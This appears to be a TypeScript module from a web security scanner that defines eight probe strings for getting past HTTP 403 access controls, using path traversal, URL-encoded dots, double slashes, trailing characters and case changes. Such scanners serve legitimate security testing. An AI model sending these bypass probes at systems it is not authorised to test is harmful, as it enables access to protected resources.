import type { PayloadVariant } from '../types';

export const META = {
  id: 'cve-based-403-bypass',
  family: 'open-redirect' as const,
  name: '403 Bypass (Path Normalization & Verb)',
  description: 'Attempts to bypass 403 responses via path normalization tricks and HTTP verb switching.',
  defaultRisk: 'none' as const,
  insertionPointKinds: ['path', 'header'],
};

const PROBES = [
  { value: '/../protected', intent: 'Path traversal prefix to bypass path-based 403 ACL', signals: ['403-bypassed'] },
  { value: '/./protected', intent: 'Current-directory dot prefix to confuse path normalization ACL', signals: ['403-bypassed'] },
  { value: '//protected', intent: 'Double-slash prefix to bypass path prefix ACL checks', signals: ['403-bypassed'] },
  { value: '%2e%2e/protected', intent: 'URL-encoded double-dot traversal to bypass path ACL', signals: ['403-bypassed'] },
  { value: '/protected%20', intent: 'Trailing space encoding to bypass exact-match path ACL', signals: ['403-bypassed'] },
  { value: '/protected/', intent: 'Trailing slash to bypass path ACL on exact-match routes', signals: ['403-bypassed'] },
  { value: '/PROTECTED', intent: 'Uppercase path to bypass case-sensitive ACL rules', signals: ['403-bypassed'] },
  { value: '/protected#', intent: 'Fragment suffix to test fragment stripping before ACL check', signals: ['403-bypassed'] },
];

export function variants(): PayloadVariant[] {
  return PROBES.map((p, i) => ({
    id: `cve-403-bypass-${i + 1}`,
    family: 'open-redirect' as const,
    value: p.value,
    encoding: 'raw' as const,
    intent: p.intent,
    requiresOast: false,
    requiresBrowser: false,
    destructiveRisk: 'none' as const,
    expectedSignals: p.signals,
  }));
}
